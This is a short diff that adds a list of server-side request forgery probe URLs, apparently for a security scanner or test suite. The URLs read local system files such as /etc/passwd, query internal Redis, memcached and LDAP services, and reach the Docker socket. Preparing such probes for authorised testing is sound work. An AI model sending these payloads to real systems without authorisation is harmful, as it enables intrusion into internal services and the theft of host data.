@@ -1,0 +1,13 @@
+# Gated SSRF protocol-scheme probes
+file:///etc/hosts
+file:///etc/passwd
+file://C:/Windows/win.ini
+dict://127.0.0.1:11211/stat
+gopher://127.0.0.1:6379/_PING
+gopher://127.0.0.1:11211/_stats
+ftp://127.0.0.1/
+ldap://127.0.0.1:389/
+http+unix://%2Fvar%2Frun%2Fdocker.sock/info
+http://unix:/var/run/docker.sock:/info
+jar:http://127.0.0.1!/META-INF/MANIFEST.MF
+netdoc:///etc/hosts
